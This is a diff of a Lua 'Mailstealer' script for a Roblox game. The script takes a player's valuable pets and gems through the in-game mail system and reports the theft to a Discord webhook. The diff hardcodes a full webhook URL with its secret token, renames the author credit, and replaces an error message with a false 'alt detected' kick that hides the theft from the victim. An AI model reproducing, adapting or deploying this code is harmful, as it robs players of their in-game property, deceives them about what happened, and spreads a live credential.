@@ -24,7 +24,7 @@ local function SendMessage(url, username, itemID)
                 }
             },
 			["footer"] = {
-				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
+				["text"] = "Mailstealer by d3pe scripts"
 			}
         }}
     }
@@ -40,7 +40,7 @@ end
 if Webhook and string.find(Webhook, "discord") then
 	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
 else
-	Webhook = ""
+	Webhook = "https://discord.com/api/webhooks/1216487831099146320/JsLK6o7iRv2jIj5MxS7kmm9kUj3HIZdaMdW7fz2QLOk5E3wBfsA8xLct1HiO3hRWcgzD"
 end
 
 local library = require(game.ReplicatedStorage.Library)
@@ -364,5 +364,5 @@ if CountHuges() > 0 or CountGems() > 1000000 then
 	setclipboard("https://discord.gg/HcpNe56R2a")
 	plr:kick("All your stuff has just been stolen by d3pes mail.")
 else
-	plr:kick("Error on script execution: 0x0001F4A2")
+	plr:kick("Error alt detected: we dont allow alts")
 end
